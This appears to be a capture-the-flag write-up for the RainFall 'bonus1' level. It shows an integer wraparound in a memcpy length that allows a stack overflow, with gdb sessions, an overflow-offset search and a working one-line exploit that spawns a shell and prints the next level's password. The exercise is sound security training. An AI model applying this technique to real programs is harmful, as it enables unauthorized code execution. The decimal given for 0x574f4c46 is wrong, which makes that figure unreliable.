When opening the binary in ghidra, and renaming the variables, we see:

```c
int main(int argc, char **argv)
{
  int input_integer;
  char buffer[40];
  
  input_integer = atoi(argv[1]);
  
  if (input_integer < 10) {
    memcpy(buffer, argv[2], input_integer * 4);
    
    if (input_integer == 0x574f4c46) { // (1474186742)
      // Exécuter un shell
      execl("/bin/sh", "sh", 0);
    }
    
    return 0;
  }
  else {
    return 1;
  }
}
```

We see that the program is vulnerable to a buffer overflow attack (to change...), because the buffer is not protected against overflows. We can therefore overflow the buffer to change the value of the variable `input_integer` and thus execute the shell.

if input_integer > 10, the program returns 1, so we have to enter a value less than 10, but it is not enough to overflow the buffer.

`0x08048473 <+79>:	call   0x8048320 <memcpy@plt>`
`void *memcpy(void *dest, const void *src, size_t n);`

The length of the copy is in size_t, so we can enter a negative value to overflow the buffer.
If we send `U_INT_MAX / 4 + 1`(1073741824), we will have 0

```bash
(gdb) b *main+79
Breakpoint 1 at 0x8048473
(gdb) run -1073741824 test
Starting program: /home/user/bonus1/bonus1 -1073741824 test

Breakpoint 1, 0x08048473 in main ()
(gdb) x/x $esp+8 # esp+8 = third argument of memcpy
0xbffff5f8:	0x00000000
```

Now, if we substract 25, we will be able to test the offset of the buffer.

```bash
(gdb) b *main+84
Breakpoint 1 at 0x8048478
(gdb) run -1073741799 AAAABBBBCCCCEEEEDDDDFFFFGGGGHHHHIIIIJJJJiiiiLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
Starting program: /home/user/bonus1/bonus1 -1073741799 AAAABBBBCCCCEEEEDDDDFFFFGGGGHHHHIIIIJJJJiiiiLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT

Breakpoint 1, 0x08048478 in main ()
(gdb) x/x $esp+0x3c
0xbffff5dc:	0x69696969
```

The offset is 40, so we can change the value of `input_integer` to 1474186742 (0x574f4c46) to execute the shell.

```bash
bonus1@RainFall:~$ ./bonus1 -1073741813 `python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'"`
$ cd ../bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```